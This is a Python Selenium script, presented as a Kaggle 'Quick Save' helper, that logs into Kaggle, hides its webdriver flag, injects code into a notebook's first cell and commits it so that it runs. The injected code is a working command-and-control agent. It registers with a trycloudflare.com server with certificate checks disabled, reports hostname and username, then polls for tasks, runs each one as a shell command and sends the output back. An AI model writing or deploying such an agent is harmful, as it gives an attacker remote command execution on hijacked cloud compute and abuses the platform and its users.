#!/usr/bin/env python3
"""Quick Save (Commit & Run) Kaggle kernels via Selenium."""

import sys
import time
from pathlib import Path

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
except ImportError:
    print("pip install selenium")
    sys.exit(1)


def create_driver(headless=True):
    options = FirefoxOptions()
    options.binary_location = "/usr/bin/firefox-esr"
    if headless:
        options.add_argument("--headless")
    options.add_argument("--width=1920")
    options.add_argument("--height=1080")
    options.set_preference("dom.webdriver.enabled", False)
    driver = webdriver.Firefox(options=options)
    driver.implicitly_wait(10)
    return driver


def quick_save_kernel(email, password, kernel_slug, headless=True):
    """Login to Kaggle and do Quick Save (Commit & Run) on kernel."""
    driver = None
    try:
        print(f"[QuickSave] Starting for {kernel_slug}")
        driver = create_driver(headless=headless)
        
        # Login
        print("[1/4] Logging in...")
        driver.get("https://www.kaggle.com/account/login?phase=emailSignIn")
        time.sleep(2)
        
        # Click Email tab
        driver.execute_script("""
        for(var b of document.querySelectorAll('button, div[role="tab"]'))
            if(b.textContent.includes('Email')) { b.click(); return true; }
        return false;
        """)
        time.sleep(0.5)
        
        # Fill credentials
        wait = WebDriverWait(driver, 15)
        email_input = wait.until(EC.presence_of_element_located((By.NAME, "email")))
        email_input.send_keys(email)
        
        pwd_input = driver.find_element(By.NAME, "password")
        pwd_input.send_keys(password)
        
        driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
        time.sleep(5)
        
        if "login" in driver.current_url.lower():
            print("Login failed!")
            return False
        
        # Navigate to kernel
        print(f"[2/4] Opening kernel {kernel_slug}...")
        driver.get(f"https://www.kaggle.com/code/{kernel_slug}")
        time.sleep(5)
        
        # Click Edit
        print("[3/4] Entering Edit mode...")
        edit_result = driver.execute_script("""
        var links = document.querySelectorAll('a[href*="/edit/"]');
        for (var link of links) {
            if (link.textContent.includes('Edit') || link.querySelector('span')) {
                link.click();
                return 'clicked edit link: ' + link.href;
            }
        }
        var buttons = document.querySelectorAll('button');
        for (var btn of buttons) {
            if (btn.textContent.toLowerCase().includes('edit')) {
                btn.click();
                return 'clicked edit button';
            }
        }
        return 'not found';
        """)
        print(f"  Edit: {edit_result}")
        time.sleep(5)
        
        # Insert new code into first cell
        print("[3.5/4] Inserting C2 agent code...")
        code = '''import os,sys,json,time,socket,platform,subprocess,hashlib,threading,urllib.request,ssl
C2_URL="https://dear-custody-shades-sold.trycloudflare.com"
KERNEL_SLUG="KERNEL_SLUG"
AGENT_ID=hashlib.sha256(("kaggle:"+KERNEL_SLUG).encode()).hexdigest()[:16]
def log(m): print(f"[AGENT] {m}",flush=True)
def _post(path,data):
    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
    try:
        req=urllib.request.Request(C2_URL.rstrip("/")+path,data=json.dumps(data).encode(),headers={"Content-Type":"application/json"})
        with urllib.request.urlopen(req,timeout=30,context=ctx) as r: return json.loads(r.read().decode())
    except Exception as e: log(f"POST fail: {e}")
    return None
def beacon():
    while True:
        try:
            res=_post("/api/agent/beacon",{"id":AGENT_ID})
            if res and "tasks" in res:
                for t in res["tasks"]:
                    try:
                        out=subprocess.check_output(t.get("payload",""),shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors="replace")
                        _post("/api/agent/result",{"task_id":t["id"],"result":out[:65000]})
                    except Exception as e: _post("/api/agent/result",{"task_id":t["id"],"result":str(e)[:65000]})
        except: pass
        time.sleep(10)
log(f"BOOT {AGENT_ID}")
info={"id":AGENT_ID,"hostname":"kaggle-"+KERNEL_SLUG.replace("/","-"),"platform_type":"kaggle","os":platform.system(),"arch":platform.machine(),"username":os.popen("whoami").read().strip()}
if _post("/api/agent/register",info): log(f"REGISTERED: {AGENT_ID}");threading.Thread(target=beacon,daemon=True).start();log("Beacon started")
else: log("REG FAILED")
'''.replace("KERNEL_SLUG", kernel_slug)
        
        insert_result = driver.execute_script(f"""
        // Find first code cell and replace content
        var cells = document.querySelectorAll('.cell-code, [data-cell-id], .CodeMirror');
        if (cells.length > 0) {{
            // Try to find CodeMirror editor
            var cm = cells[0].querySelector('.CodeMirror') || cells[0];
            if (cm.CodeMirror) {{
                cm.CodeMirror.setValue(`{code}`);
                return 'inserted via CodeMirror';
            }}
            // Try textarea
            var ta = cells[0].querySelector('textarea');
            if (ta) {{
                ta.value = `{code}`;
                ta.dispatchEvent(new Event('input', {{bubbles: true}}));
                return 'inserted via textarea';
            }}
        }}
        // Try JupyterLab
        var notebooks = document.querySelectorAll('[data-jupyterlab]');
        if (notebooks.length > 0) {{
            return 'jupyterlab found - need different approach';
        }}
        return 'no editor found';
        """)
        print(f"  Insert: {insert_result}")
        time.sleep(2)
        
        # Quick Save (Commit & Run) - "Save Version" button
        print("[4/4] Save Version (Commit & Run)...")
        save_result = driver.execute_script("""
        // Find Save Version button
        var buttons = document.querySelectorAll('button, [role="button"]');
        for (var btn of buttons) {
            var text = btn.textContent || '';
            if (text.includes('Save Version') || text.includes('Save version')) {
                btn.click();
                return 'clicked: ' + text;
            }
        }
        return 'not found';
        """)
        print(f"  Save: {save_result}")
        
        if 'clicked' in save_result.lower():
            print("✓ Quick Save triggered! Waiting for commit...")
            time.sleep(10)
            
            # Screenshot
            ss_path = Path(f'/tmp/quicksave_{kernel_slug.replace("/","_")}.png')
            driver.save_screenshot(str(ss_path))
            print(f"  Screenshot: {ss_path}")
            return True
        else:
            print(f"✗ Quick Save not found: {save_result}")
            ss_path = Path(f'/tmp/quicksave_fail_{kernel_slug.replace("/","_")}.png')
            driver.save_screenshot(str(ss_path))
            print(f"  Screenshot: {ss_path}")
            return False
            
    except Exception as e:
        print(f"Error: {e}")
        return False
    finally:
        if driver:
            driver.quit()


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python kaggle_quick_save.py <email> <password> <kernel_slug>")
        sys.exit(1)
    
    email = sys.argv[1]
    password = sys.argv[2]
    kernel_slug = sys.argv[3]
    headless = "--show" not in sys.argv
    
    success = quick_save_kernel(email, password, kernel_slug, headless=headless)
    print(f"\nResult: {'SUCCESS' if success else 'FAILED'}")
